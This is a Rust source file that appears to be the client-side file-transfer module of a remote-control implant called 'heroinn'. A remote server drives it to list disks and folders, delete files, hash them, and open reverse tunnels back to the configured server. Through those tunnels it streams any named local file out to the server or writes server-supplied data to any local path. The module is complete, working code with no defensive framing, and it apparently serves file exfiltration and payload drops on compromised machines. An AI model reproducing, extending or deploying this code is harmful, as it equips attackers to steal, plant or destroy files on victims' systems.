//! Client-side file-transfer session.
//!
//! The server drives this session with RPC calls (executed locally against the
//! file system) and with `Get`/`Put` requests that open a reverse tunnel.

use std::io::{Read, Seek, SeekFrom, Write};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, mpsc::Sender};
use std::time::Duration;

use heroinn_util::{
    Error, HeroinnProtocol, Result,
    ftp::{FTPGetHeader, FTPId, FTPPacket, FTPPutHeader, method::*},
    packet::TunnelRequest,
    protocol::{Transport, TransportFactory},
    rpc::{RpcMessage, RpcServer},
    session::{ClientSession, Session, SessionBase, SessionPacket},
};

use crate::config::master_configure;
use crate::diagnostics;
use crate::module::transfer;

const TRANSFER_COMPLETION_TIMEOUT: Duration = Duration::from_secs(10);

/// A live file-transfer channel on the client side.
pub struct FtpClient {
    id: String,
    clientid: String,
    closed: Arc<AtomicBool>,
    rpc_server: RpcServer,
    sender: Sender<SessionBase>,
    transport_factory: Arc<TransportFactory>,
}

impl ClientSession for FtpClient {
    fn new_client(sender: Sender<SessionBase>, clientid: &str, id: &str) -> Result<Self> {
        Self::new_client_with_factory(sender, clientid, id, Arc::new(TransportFactory::direct()))
    }
}

impl FtpClient {
    pub fn new_client_with_factory(
        sender: Sender<SessionBase>,
        clientid: &str,
        id: &str,
        transport_factory: Arc<TransportFactory>,
    ) -> Result<Self> {
        let mut rpc_server = RpcServer::new();
        rpc_server.register("get_disk_info", get_disk_info);
        rpc_server.register("get_folder_info", get_folder_info);
        rpc_server.register("join_path", join_path);
        rpc_server.register("remove_file", remove_file);
        rpc_server.register("file_size", file_size);
        rpc_server.register("md5_file", md5_file);

        Ok(Self {
            id: id.to_string(),
            clientid: clientid.to_string(),
            closed: Arc::new(AtomicBool::new(false)),
            rpc_server,
            sender,
            transport_factory,
        })
    }
}

impl Session for FtpClient {
    fn id(&self) -> &str {
        &self.id
    }

    fn clientid(&self) -> &str {
        &self.clientid
    }

    fn write(&mut self, data: &[u8]) -> Result<()> {
        let packet = FTPPacket::parse(data)?;

        match packet.id()? {
            FTPId::RPC => {
                log::debug!("recv rpc call");
                let msg = RpcMessage::parse(&packet.data)?;
                let ret = self.rpc_server.call(&msg);

                let packet = FTPPacket {
                    id: FTPId::RPC.to_u8(),
                    data: ret.serialize()?,
                };

                let packet = SessionPacket {
                    id: self.id.clone(),
                    data: packet.serialize()?,
                };
                log::debug!("call ret : {:?}", ret);
                if let Err(e) = self.sender.send(SessionBase {
                    id: self.id.clone(),
                    clientid: self.clientid.clone(),
                    packet,
                }) {
                    log::error!("session sender error : {}", e);
                    self.closed.store(true, Ordering::Relaxed);
                };
            }
            FTPId::Get => {
                let request = TunnelRequest::parse(&packet.data)?;
                let closed = self.closed.clone();
                let factory = self.transport_factory.clone();

                std::thread::spawn(move || upload_worker(request, closed, factory));
            }
            FTPId::Put => {
                let request = TunnelRequest::parse(&packet.data)?;
                let closed = self.closed.clone();
                let factory = self.transport_factory.clone();

                std::thread::spawn(move || download_worker(request, closed, factory));
            }
            FTPId::Close => {
                self.close();
            }
        }

        Ok(())
    }

    fn alive(&self) -> bool {
        !self.closed.load(Ordering::Relaxed)
    }

    fn close(&mut self) {
        log::info!("ftp session closed");
        self.closed.store(true, Ordering::Relaxed);
    }
}

/// Open a tunnel back to the server and stream the requested file into it.
fn upload_worker(request: TunnelRequest, closed: Arc<AtomicBool>, factory: Arc<TransportFactory>) {
    let mut tunnel = match open_tunnel(request.port, &factory) {
        Ok(p) => p,
        Err(e) => {
            diagnostics::report_connect_failure(&e);
            closed.store(true, Ordering::Relaxed);
            return;
        }
    };
    log::debug!("create tunnel success");

    let header = match transfer::recv(&mut tunnel) {
        Ok(p) => p,
        Err(e) => {
            report_tunnel_failure("ftp_download_header", &tunnel, &e, &closed);
            return;
        }
    };

    let header = match FTPGetHeader::parse(&header) {
        Ok(header) => header,
        Err(e) => {
            report_tunnel_failure("ftp_download_header_parse", &tunnel, &e, &closed);
            return;
        }
    };

    let mut f = match std::fs::File::open(&header.path) {
        Ok(p) => p,
        Err(e) => {
            diagnostics::report_local_failure("ftp_download_open_source", e);
            closed.store(true, Ordering::Relaxed);
            return;
        }
    };

    let source_size = match f.metadata() {
        Ok(metadata) => metadata.len(),
        Err(e) => {
            diagnostics::report_local_failure("ftp_download_stat_source", e);
            closed.store(true, Ordering::Relaxed);
            return;
        }
    };

    if header.start_pos != 0
        && let Err(e) = f.seek(SeekFrom::Start(header.start_pos))
    {
        diagnostics::report_local_failure("ftp_download_seek_source", e);
        closed.store(true, Ordering::Relaxed);
        return;
    }

    let remaining = source_size.saturating_sub(header.start_pos);
    let mut sent = 0u64;
    log::debug!("start get transfer [{}]", header.path);
    loop {
        if closed.load(Ordering::Relaxed) {
            log::info!("download-source worker stopped because the ftp session closed");
            return;
        }

        let mut buf = [0u8; 1024 * 20];
        let size = match f.read(&mut buf) {
            Ok(p) => p,
            Err(e) => {
                diagnostics::report_local_failure("ftp_download_read_source", e);
                closed.store(true, Ordering::Relaxed);
                return;
            }
        };

        if size == 0 {
            break;
        }

        log::debug!("send file data [{}]", size);
        if let Err(e) = transfer::send(&mut tunnel, &buf[..size]) {
            report_tunnel_failure("ftp_download_send_frame", &tunnel, &e, &closed);
            return;
        };
        sent = sent.saturating_add(size as u64);

        match tunnel.remote_closed() {
            Ok(true) if sent < remaining => {
                report_tunnel_failure(
                    "ftp_download_remote_closed_early",
                    &tunnel,
                    &Error::Io(std::io::Error::new(
                        std::io::ErrorKind::BrokenPipe,
                        format!(
                            "tunnel closed after {sent} of {remaining} bytes with no close_notify or completion signal"
                        ),
                    )),
                    &closed,
                );
                return;
            }
            Ok(_) => {}
            Err(e) => {
                report_tunnel_failure("ftp_download_remote_close", &tunnel, &e, &closed);
                return;
            }
        }
    }

    if remaining > 0
        && let Err(e) = tunnel.wait_for_remote_close(TRANSFER_COMPLETION_TIMEOUT)
    {
        report_tunnel_failure("ftp_download_completion", &tunnel, &e, &closed);
        return;
    }

    log::info!("get file worker finished");
}

/// Open a tunnel back to the server and write the received data into a file.
fn download_worker(
    request: TunnelRequest,
    closed: Arc<AtomicBool>,
    factory: Arc<TransportFactory>,
) {
    let mut tunnel = match open_tunnel(request.port, &factory) {
        Ok(p) => p,
        Err(e) => {
            diagnostics::report_connect_failure(&e);
            closed.store(true, Ordering::Relaxed);
            return;
        }
    };
    log::debug!("create tunnel success");

    let header = match transfer::recv(&mut tunnel) {
        Ok(p) => p,
        Err(e) => {
            report_tunnel_failure("ftp_download_header", &tunnel, &e, &closed);
            return;
        }
    };

    let header = match FTPPutHeader::parse(&header) {
        Ok(p) => p,
        Err(e) => {
            report_tunnel_failure("ftp_download_header_parse", &tunnel, &e, &closed);
            return;
        }
    };

    let mut f = if header.start_pos == 0 {
        match std::fs::File::create(&header.path) {
            Ok(p) => p,
            Err(e) => {
                diagnostics::report_local_failure("ftp_download_create_target", e);
                closed.store(true, Ordering::Relaxed);
                return;
            }
        }
    } else {
        let mut f = match std::fs::File::options().write(true).open(&header.path) {
            Ok(p) => p,
            Err(e) => {
                diagnostics::report_local_failure("ftp_download_open_target", e);
                closed.store(true, Ordering::Relaxed);
                return;
            }
        };

        if let Err(e) = f.seek(SeekFrom::Start(header.start_pos)) {
            diagnostics::report_local_failure("ftp_download_seek_target", e);
            closed.store(true, Ordering::Relaxed);
            return;
        }
        f
    };

    log::debug!("start put transfer [{}]", header.path);
    loop {
        if closed.load(Ordering::Relaxed) {
            log::info!("download worker stopped because the ftp session closed");
            return;
        }

        let data = match transfer::recv(&mut tunnel) {
            Ok(p) => p,
            Err(e) => {
                report_tunnel_failure("ftp_download_recv_frame", &tunnel, &e, &closed);
                return;
            }
        };

        if data.is_empty() {
            report_tunnel_failure(
                "ftp_download_unexpected_eof",
                &tunnel,
                &Error::Other(format!(
                    "tunnel closed before the declared {}-byte file completed",
                    header.total_size
                )),
                &closed,
            );
            return;
        }

        if let Err(e) = f.write_all(&data) {
            diagnostics::report_local_failure("ftp_download_write_target", e);
            closed.store(true, Ordering::Relaxed);
            return;
        };
        log::debug!("recv transfer data [{}]", data.len());

        let pos = match f.stream_position() {
            Ok(p) => p,
            Err(e) => {
                diagnostics::report_local_failure("ftp_download_stat_target", e);
                closed.store(true, Ordering::Relaxed);
                return;
            }
        };

        if pos >= header.total_size {
            break;
        }
    }
}

fn report_tunnel_failure(
    operation: &'static str,
    tunnel: &Transport,
    error: &Error,
    closed: &AtomicBool,
) {
    diagnostics::report_data_plane_failure(operation, tunnel.proxy_context(), error);
    closed.store(true, Ordering::Relaxed);
}

/// Open a reverse tunnel back to the configured server.
fn open_tunnel(port: u16, factory: &TransportFactory) -> Result<Transport> {
    let config = master_configure();
    let proto = HeroinnProtocol::try_from(config.protocol)
        .map_err(|e| Error::Other(format!("unknown protocol : {}", e)))?;

    Transport::tunnel_with_factory(factory, &proto, &config.address, port)
}
